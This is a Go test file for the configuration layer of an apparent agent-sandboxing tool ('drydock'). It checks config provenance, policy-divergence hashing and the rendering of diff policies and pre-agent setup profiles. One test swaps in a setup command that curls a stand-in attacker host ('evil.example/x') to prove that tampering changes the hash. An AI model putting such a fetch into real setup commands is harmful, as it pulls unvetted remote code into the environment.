package config

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func fieldByName(fs []Field, name string) (Field, bool) {
	for _, f := range fs {
		if f.Name == name {
			return f, true
		}
	}
	return Field{}, false
}

func TestExplain_SourceAttribution(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	// A yaml that sets task_timeout (yaml-only) and network (also env-overridable).
	yaml := "network: from-yaml\ngateway_ip: 1.2.3.4\ntask_timeout: 45m\n"
	path := filepath.Join(t.TempDir(), "c.yaml")
	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	// Env overrides gateway_ip with a valid value, and task_budget with an
	// INVALID value (<=0) that must fall through to the default.
	t.Setenv("DRYDOCK_GW_IP", "10.0.0.9")
	t.Setenv("DRYDOCK_TASK_BUDGET_USD", "-5") // fails the f>0 guard

	fields, cfg, err := Explain(path)
	if err != nil {
		t.Fatalf("Explain: %v", err)
	}
	if cfg.GatewayIP != "10.0.0.9" {
		t.Errorf("resolved gateway = %q, want env value", cfg.GatewayIP)
	}
	check := func(name string, wantSrc Source, wantVal string) {
		f, ok := fieldByName(fields, name)
		if !ok {
			t.Fatalf("field %q missing from Explain", name)
		}
		if f.Source != wantSrc {
			t.Errorf("%s source = %q, want %q", name, f.Source, wantSrc)
		}
		if wantVal != "" && f.Value != wantVal {
			t.Errorf("%s value = %q, want %q", name, f.Value, wantVal)
		}
	}
	check("GatewayIP", SourceEnv, "10.0.0.9")
	check("Network", SourceYAML, "from-yaml")
	check("TaskTimeout", SourceYAML, "45m0s")
	check("TaskBudgetUSD", SourceDefault, "2") // env was invalid → default
	check("MaxConcurrent", SourceDefault, "")
}

// The provenance table must not silently drift from applyEnvOverrides: every
// env var handled there must be represented by exactly one Field.EnvVar.
func TestExplain_CoversEveryEnvOverride(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	fields, _, err := Explain(filepath.Join(t.TempDir(), "missing.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]bool{}
	for _, f := range fields {
		if f.EnvVar != "" {
			got[f.EnvVar] = true
		}
	}
	// Keep this list identical to the env vars applyEnvOverrides reads.
	want := []string{
		"DRYDOCK_NETWORK", "DRYDOCK_GW_IP", "SANDBOX_IMAGE", "DRYDOCK_ANCHOR_IMAGE",
		"DRYDOCK_TASK_BUDGET_USD", "DRYDOCK_MAX_CONCURRENT_TASKS", "DRYDOCK_DEFAULT_MODEL",
		"DRYDOCK_DEFAULT_AGENT", "DRYDOCK_ANTHROPIC_AUTH", "DRYDOCK_OPENAI_AUTH",
		"DRYDOCK_TASK_MAX_REQUESTS", "DRYDOCK_TASK_MAX_INFLIGHT", "DRYDOCK_STAGE_QUOTA_GB",
		"DRYDOCK_AGGREGATE_BUDGET_USD", "DRYDOCK_MAX_REQUEST_COST_USD", "DRYDOCK_AGGREGATE_WINDOW",
		"DRYDOCK_PUSH_MAX_RETRIES", "DRYDOCK_PUSH_RETRY_BACKOFF", "DRYDOCK_PUSH_FRESH_BRANCH_TRIES",
		"STAGE_ROOT", "AUDIT_ROOT", "SQUID_RUN_DIR", "BROKER_SOCKET", "BROKER_ADDR",
		"DRYDOCK_NO_NOTIFY", "DRYDOCK_LOG_JSON", "DRYDOCK_STRICT_CONTAINER_VERSION",
	}
	for _, ev := range want {
		if !got[ev] {
			t.Errorf("env var %q handled by applyEnvOverrides but not in Explain provenance", ev)
		}
	}
}

// PolicyComparisonFields must drop exactly the two broker connection fields
// (how you reach the daemon, not policy it enforces) and keep everything else
// in order — otherwise a client dialing a remote daemon via BROKER_ADDR would
// see a spurious DIVERGENT verdict.
func TestPolicyComparisonFields_ExcludesOnlyConnectionFields(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	all, _, err := Explain(filepath.Join(t.TempDir(), "missing.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	cmp := PolicyComparisonFields(all)
	if len(cmp) != len(all)-2 {
		t.Fatalf("comparison set has %d fields, want %d (all minus the 2 connection fields)", len(cmp), len(all)-2)
	}
	for _, name := range []string{"Broker.Socket", "Broker.Addr"} {
		if _, ok := fieldByName(all, name); !ok {
			t.Fatalf("field %q missing from full Explain output — exclusion list is stale", name)
		}
		if _, ok := fieldByName(cmp, name); ok {
			t.Errorf("connection field %q must be excluded from the comparison set", name)
		}
	}
	// Every non-connection field survives, in the same relative order.
	i := 0
	for _, f := range all {
		if f.Name == "Broker.Socket" || f.Name == "Broker.Addr" {
			continue
		}
		if cmp[i].Name != f.Name {
			t.Fatalf("comparison field %d = %q, want %q (order/content must be preserved)", i, cmp[i].Name, f.Name)
		}
		i++
	}
	// Divergence in a connection field alone must not change the hash.
	varied := make([]Field, len(all))
	copy(varied, all)
	for i := range varied {
		if varied[i].Name == "Broker.Addr" {
			varied[i].Value = "somewhere-else:9999"
		}
	}
	if EffectiveHash(PolicyComparisonFields(all)) != EffectiveHash(PolicyComparisonFields(varied)) {
		t.Error("comparison hash changed when only Broker.Addr differed")
	}
}

func TestEffectiveHash_StableAndSensitive(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	f1, _, _ := Explain(filepath.Join(t.TempDir(), "m.yaml"))
	f2, _, _ := Explain(filepath.Join(t.TempDir(), "m.yaml"))
	if EffectiveHash(f1) != EffectiveHash(f2) {
		t.Error("hash not stable across identical loads")
	}
	if len(EffectiveHash(f1)) != 64 {
		t.Error("hash not 64 hex chars")
	}
	t.Setenv("DRYDOCK_NETWORK", "different")
	f3, _, _ := Explain(filepath.Join(t.TempDir(), "m.yaml"))
	if EffectiveHash(f3) == EffectiveHash(f1) {
		t.Error("hash unchanged after a value changed")
	}
}

// DiffPolicy is enforced policy: it must appear in the provenance table as a
// yaml-only field (no env override), attribute to config.yaml exactly when
// the yaml sets any of its fields, and stay in the policy-comparison set so
// a host/daemon divergence in diff policy trips the DIVERGENT verdict.
func TestExplain_DiffPolicyProvenance(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	// Absent from yaml → default, rendered "disabled".
	fields, _, err := Explain(filepath.Join(t.TempDir(), "missing.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	f, ok := fieldByName(fields, "DiffPolicy")
	if !ok {
		t.Fatal("DiffPolicy missing from Explain provenance")
	}
	if f.EnvVar != "" {
		t.Errorf("DiffPolicy must be yaml-only, got env var %q", f.EnvVar)
	}
	if f.YAMLKey != "diff_policy" {
		t.Errorf("DiffPolicy yaml key = %q, want diff_policy", f.YAMLKey)
	}
	if f.Source != SourceDefault {
		t.Errorf("DiffPolicy source = %q, want %q when absent", f.Source, SourceDefault)
	}
	if f.Value != "disabled" {
		t.Errorf("DiffPolicy value = %q, want disabled", f.Value)
	}

	// Set in yaml → config.yaml, compact summary.
	yaml := "network: x\ngateway_ip: 1.2.3.4\n" +
		"diff_policy:\n  max_files_changed: 50\n  max_lines_changed: 2000\n" +
		"  blocked_paths: [\"**/*.pem\", \".github/workflows/**\"]\n" +
		"  second_look_paths: [\"**/Dockerfile\"]\n"
	path := filepath.Join(t.TempDir(), "c.yaml")
	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	fields, _, err = Explain(path)
	if err != nil {
		t.Fatal(err)
	}
	f, ok = fieldByName(fields, "DiffPolicy")
	if !ok {
		t.Fatal("DiffPolicy missing from Explain provenance")
	}
	if f.Source != SourceYAML {
		t.Errorf("DiffPolicy source = %q, want %q when yaml sets it", f.Source, SourceYAML)
	}
	want := fmt.Sprintf("50 files / 2000 lines / 2 blocked (%s) / 1 second-look (%s)",
		globsHash([]string{"**/*.pem", ".github/workflows/**"}),
		globsHash([]string{"**/Dockerfile"}))
	if f.Value != want {
		t.Errorf("DiffPolicy value = %q, want %q", f.Value, want)
	}

	// It is enforced policy — it must survive PolicyComparisonFields.
	if _, ok := fieldByName(PolicyComparisonFields(fields), "DiffPolicy"); !ok {
		t.Error("DiffPolicy must stay in the policy-comparison field set")
	}
}

// Profiles is enforced pre-agent policy: it must appear in the provenance
// table as a yaml-only field (no env override), attribute to config.yaml
// exactly when the yaml configures any repo, and stay in the
// policy-comparison set.
func TestExplain_ProfilesProvenance(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	// Absent from yaml → default, rendered "disabled".
	fields, _, err := Explain(filepath.Join(t.TempDir(), "missing.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	f, ok := fieldByName(fields, "Profiles")
	if !ok {
		t.Fatal("Profiles missing from Explain provenance")
	}
	if f.EnvVar != "" {
		t.Errorf("Profiles must be yaml-only, got env var %q", f.EnvVar)
	}
	if f.YAMLKey != "profiles" {
		t.Errorf("Profiles yaml key = %q, want profiles", f.YAMLKey)
	}
	if f.Source != SourceDefault {
		t.Errorf("Profiles source = %q, want %q when absent", f.Source, SourceDefault)
	}
	if f.Value != "disabled" {
		t.Errorf("Profiles value = %q, want disabled", f.Value)
	}

	// Set in yaml → config.yaml, compact summary.
	yaml := "network: x\ngateway_ip: 1.2.3.4\n" +
		"profiles:\n  repos:\n    \"github.com/o/r\":\n" +
		"      setup:\n        - [\"npm\", \"ci\"]\n        - [\"npm\", \"run\", \"build\"]\n" +
		"      readiness:\n        - [\"curl\", \"-fsS\", \"localhost:3000\"]\n" +
		"      timeout: 10m\n"
	path := filepath.Join(t.TempDir(), "c.yaml")
	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	fields, _, err = Explain(path)
	if err != nil {
		t.Fatal(err)
	}
	f, ok = fieldByName(fields, "Profiles")
	if !ok {
		t.Fatal("Profiles missing from Explain provenance")
	}
	if f.Source != SourceYAML {
		t.Errorf("Profiles source = %q, want %q when yaml sets it", f.Source, SourceYAML)
	}
	want := fmt.Sprintf("1 repos / 2 setup / 1 readiness (%s)",
		profilesHash(map[string]SetupProfile{
			"github.com/o/r": {
				Setup:     [][]string{{"npm", "ci"}, {"npm", "run", "build"}},
				Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
				Timeout:   10 * time.Minute,
			},
		}))
	if f.Value != want {
		t.Errorf("Profiles value = %q, want %q", f.Value, want)
	}

	// It shapes what runs pre-agent — it must survive PolicyComparisonFields.
	if _, ok := fieldByName(PolicyComparisonFields(fields), "Profiles"); !ok {
		t.Error("Profiles must stay in the policy-comparison field set")
	}
}

// The rendered DiffPolicy value feeds EffectiveHash, which is the divergence
// comparison unit for `drydock policy explain`. If the glob lists collapsed to
// bare counts, editing a blocked glob (security enforcement) without changing
// the count would falsely report "in sync". Pin the two properties that
// prevent that: different glob CONTENT with equal counts → different value
// (and hash); same globs in a different ORDER → identical value.
func TestExplain_DiffPolicyValueIsGlobContentSensitive(t *testing.T) {
	base := DiffPolicy{
		MaxFilesChanged: 50,
		MaxLinesChanged: 2000,
		BlockedPaths:    []string{"**/*.pem", ".github/workflows/**"},
		SecondLookPaths: []string{"**/Dockerfile"},
	}

	// Same counts, different blocked_paths content → values must differ.
	edited := base
	edited.BlockedPaths = []string{"**/*.pem", "secrets/**"}
	vBase, vEdited := renderDiffPolicy(base), renderDiffPolicy(edited)
	if vBase == vEdited {
		t.Errorf("equal-count configs with different blocked_paths rendered identically: %q", vBase)
	}
	fBase := []Field{{Name: "DiffPolicy", Value: vBase}}
	fEdited := []Field{{Name: "DiffPolicy", Value: vEdited}}
	if EffectiveHash(fBase) == EffectiveHash(fEdited) {
		t.Error("EffectiveHash unchanged after a blocked_paths glob edit — divergence would go undetected")
	}

	// Same globs, different order → semantically identical, values must match.
	reordered := base
	reordered.BlockedPaths = []string{".github/workflows/**", "**/*.pem"}
	if vReordered := renderDiffPolicy(reordered); vReordered != vBase {
		t.Errorf("reordered globs rendered differently: %q vs %q — spurious divergence", vReordered, vBase)
	}
	// And the sort must not have mutated the caller's slice.
	if reordered.BlockedPaths[0] != ".github/workflows/**" {
		t.Error("renderDiffPolicy mutated the caller's BlockedPaths slice")
	}

	// The fully-zero block still renders exactly "disabled".
	if got := renderDiffPolicy(DiffPolicy{}); got != "disabled" {
		t.Errorf("zero DiffPolicy = %q, want disabled", got)
	}
}

// The rendered Profiles value feeds EffectiveHash, the divergence comparison
// unit for `drydock policy explain`. A count-only summary would let an edit to
// a setup command's CONTENT (pre-agent execution with egress — the
// highest-severity surface) slip through as "in sync" whenever the counts
// stayed equal. Pin the properties that prevent that:
//   - equal counts, different command content → different value and hash;
//   - repo ORDER is not semantic (maps are unordered; blocks sort by key) →
//     identical value;
//   - command ORDER within a repo IS semantic (`npm ci` must run before
//     `npm run build`, so reordering is a real config change) → different value.
func TestExplain_ProfilesValueIsCommandContentSensitive(t *testing.T) {
	base := map[string]SetupProfile{
		"github.com/o/r": {
			Setup:     [][]string{{"npm", "ci"}, {"npm", "run", "build"}},
			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
		},
		"github.com/o/s": {
			Setup: [][]string{{"make", "deps"}},
		},
	}

	// Same counts everywhere, different setup command content → must differ.
	edited := map[string]SetupProfile{
		"github.com/o/r": {
			Setup:     [][]string{{"npm", "ci"}, {"curl", "evil.example/x"}},
			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
		},
		"github.com/o/s": {
			Setup: [][]string{{"make", "deps"}},
		},
	}
	vBase, vEdited := renderProfiles(base), renderProfiles(edited)
	if vBase == vEdited {
		t.Errorf("equal-count configs with different setup commands rendered identically: %q", vBase)
	}
	fBase := []Field{{Name: "Profiles", Value: vBase}}
	fEdited := []Field{{Name: "Profiles", Value: vEdited}}
	if EffectiveHash(fBase) == EffectiveHash(fEdited) {
		t.Error("EffectiveHash unchanged after a setup command edit — divergence would go undetected")
	}

	// Same content, repos inserted in the opposite order → repo order is not
	// semantic (per-repo blocks sort by key), values must match.
	repoReordered := map[string]SetupProfile{}
	repoReordered["github.com/o/s"] = base["github.com/o/s"]
	repoReordered["github.com/o/r"] = base["github.com/o/r"]
	if v := renderProfiles(repoReordered); v != vBase {
		t.Errorf("repo-reordered config rendered differently: %q vs %q — spurious divergence", v, vBase)
	}

	// Same commands, swapped order within one repo's setup list → execution
	// order is significant, so this is a real change and MUST differ.
	cmdReordered := map[string]SetupProfile{
		"github.com/o/r": {
			Setup:     [][]string{{"npm", "run", "build"}, {"npm", "ci"}},
			Readiness: [][]string{{"curl", "-fsS", "localhost:3000"}},
		},
		"github.com/o/s": {
			Setup: [][]string{{"make", "deps"}},
		},
	}
	if v := renderProfiles(cmdReordered); v == vBase {
		t.Errorf("reordering commands within a repo rendered identically (%q) — execution-order change would go undetected", v)
	}

	// Same commands, timeout-only edit → the timeout is a documented hard
	// bound on setup execution, so a daemon-vs-config timeout drift is real
	// divergence and MUST flip the value/hash.
	timeoutEdited := map[string]SetupProfile{
		"github.com/o/r": {
			Setup:     base["github.com/o/r"].Setup,
			Readiness: base["github.com/o/r"].Readiness,
			Timeout:   10 * time.Minute,
		},
		"github.com/o/s": base["github.com/o/s"],
	}
	vTimeout := renderProfiles(timeoutEdited)
	if vTimeout == vBase {
		t.Errorf("timeout-only edit rendered identically (%q) — timeout divergence would go undetected", vTimeout)
	}
	if EffectiveHash([]Field{{Name: "Profiles", Value: vTimeout}}) == EffectiveHash(fBase) {
		t.Error("EffectiveHash unchanged after a timeout-only edit — divergence would go undetected")
	}

	// Same characters, different argv element boundaries → a space-join would
	// render ["sh","-c","a b"] and ["sh","-c","a","b"] identically; the
	// quoted encoding must keep them distinct.
	oneArg := map[string]SetupProfile{
		"github.com/o/r": {Setup: [][]string{{"sh", "-c", "a b"}}},
	}
	twoArgs := map[string]SetupProfile{
		"github.com/o/r": {Setup: [][]string{{"sh", "-c", "a", "b"}}},
	}
	vOne, vTwo := renderProfiles(oneArg), renderProfiles(twoArgs)
	if vOne == vTwo {
		t.Errorf("argv-boundary edit rendered identically: %q — [\"sh\",\"-c\",\"a b\"] and [\"sh\",\"-c\",\"a\",\"b\"] collide", vOne)
	}

	// Rendering must not have mutated the caller's config.
	if got := base["github.com/o/r"].Setup[0][0]; got != "npm" || base["github.com/o/r"].Setup[0][1] != "ci" {
		t.Errorf("renderProfiles mutated the caller's setup commands: first cmd now %q", got)
	}
	if base["github.com/o/r"].Setup[1][2] != "build" || base["github.com/o/s"].Setup[0][0] != "make" {
		t.Error("renderProfiles mutated the caller's setup commands")
	}

	// The empty map still renders exactly "disabled".
	if got := renderProfiles(nil); got != "disabled" {
		t.Errorf("nil profiles = %q, want disabled", got)
	}
	if got := renderProfiles(map[string]SetupProfile{}); got != "disabled" {
		t.Errorf("empty profiles = %q, want disabled", got)
	}
}
